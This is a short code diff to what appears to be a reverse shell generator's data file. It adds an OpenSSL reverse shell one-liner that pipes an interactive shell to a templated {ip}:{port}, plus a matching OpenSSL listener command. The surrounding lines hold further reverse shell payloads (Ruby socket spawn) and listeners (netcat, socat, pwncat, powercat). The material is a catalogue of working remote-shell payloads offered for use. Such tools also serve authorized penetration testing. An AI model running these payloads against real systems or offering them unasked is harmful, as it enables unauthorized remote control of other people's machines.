@@ -261,6 +261,11 @@ const reverseShellCommands = withCommandType(
             "meta": ["linux"]
         },
         {
+            "name": "OpenSSL",
+            "command": "mkfifo /tmp/s; {shell} -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s",
+            "meta": ["linux", "mac"]
+        },
+        {
             "name": "Ruby #1",
             "command": "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"{ip}\",{port}))'",
             "meta": ["linux", "mac"]
@@ -587,6 +592,7 @@ const rsgData = {
 		['rustcat', 'rcat listen {port}'],
         ['pwncat', 'python3 -m pwncat -lp {port}'],
         ['windows ConPty', 'stty raw -echo; (stty size; cat) | nc -lvnp {port}'],
+        ['openssl', 'openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 30 -nodes; openssl s_server -quiet -key key.pem -cert cert.pem -port {port}'],
         ['socat', 'socat -d -d TCP-LISTEN:{port} STDOUT'],
         ['socat (TTY)', 'socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{port}'],
         ['powercat', 'powercat -l -p {port}'],
